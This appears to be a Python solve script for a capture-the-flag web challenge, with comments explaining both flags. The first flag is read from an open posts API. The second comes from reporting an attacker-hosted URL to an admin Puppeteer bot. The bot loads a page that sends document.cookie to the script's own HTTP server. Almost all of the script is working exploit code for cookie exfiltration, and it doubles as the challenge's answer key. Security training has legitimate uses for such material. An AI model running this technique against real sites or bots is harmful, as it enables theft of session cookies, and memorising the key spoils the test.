import os
import threading
import time

import requests
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HOST = os.environ.get("SERVICE_THE_MATRIX_WEB_HOST", "127.0.0.1")
PORT = os.environ.get("SERVICE_THE_MATRIX_WEB_PORT", "3000")
BASE_URL = f"http://{HOST}:{PORT}"

# flag1 ("easy"): the real THREAD_FLAG is simply posted publicly as
# thread id 9999 ("oracle" / "flag"), readable via the unauthenticated
# GET /api/posts -- no exploitation needed at all.
#
# flag2 ("hard"): POST /api/report queues an arbitrary URL for a
# Puppeteer bot to visit, with "intentionally no origin / domain
# restrictions". Before navigating, the bot logs itself in as the real
# admin account (using the server's own secret admin token) and then
# calls page.setCookie(...) for a "flag" cookie (httpOnly: false) on
# several origins, including whatever origin our reported URL parses
# to -- then navigates there. So we don't need any XSS on the forum
# app at all: we just host our own page (reachable by the bot), and by
# the time the bot loads it, our own origin already has that
# non-HttpOnly "flag" cookie set. The page reads document.cookie and
# exfiltrates it back to our own tiny HTTP server.

exfil_event = threading.Event()
exfil_cookie = {"value": None}


class _ExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/exfil"):
            from urllib.parse import urlparse, parse_qs

            qs = parse_qs(urlparse(self.path).query)
            cookie = qs.get("c", [""])[0]
            if cookie:
                exfil_cookie["value"] = cookie
                exfil_event.set()
            self.send_response(200)
            self.end_headers()
            return

        body = b"""<!DOCTYPE html><html><body>
<script>
fetch('/exfil?c=' + encodeURIComponent(document.cookie));
</script>
</body></html>"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        pass


def start_http_server():
    server = ThreadingHTTPServer(("0.0.0.0", 8000), _ExfilHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()


def own_reachable_address():
    import socket

    return socket.gethostbyname(socket.gethostname())


def main():
    r = requests.get(f"{BASE_URL}/api/posts", timeout=15)
    r.raise_for_status()
    posts = r.json()["posts"]
    thread_flag = next(p["content"] for p in posts if p.get("id") == 9999)
    print(f"flag1: {thread_flag}")

    start_http_server()
    own_url = f"http://{own_reachable_address()}:8000/"

    r = requests.post(f"{BASE_URL}/api/report", json={"url": own_url}, timeout=15)
    r.raise_for_status()

    if not exfil_event.wait(timeout=60):
        raise SystemExit("timed out waiting for the bot to visit and exfiltrate the cookie")

    cookie_header = exfil_cookie["value"]
    bot_flag = None
    for part in cookie_header.split(";"):
        name, _, value = part.strip().partition("=")
        if name == "flag":
            bot_flag = value
            break
    print(f"flag2: {bot_flag}")

    flag1_env = os.environ.get("flag_flag1")
    flag2_env = os.environ.get("flag_flag2")
    if flag1_env and flag1_env not in thread_flag:
        raise SystemExit(f"flag1 mismatch: expected {flag1_env!r} to be in {thread_flag!r}")
    if flag2_env and (not bot_flag or flag2_env not in bot_flag):
        raise SystemExit(f"flag2 mismatch: expected {flag2_env!r} to be in {bot_flag!r}")


if __name__ == "__main__":
    main()
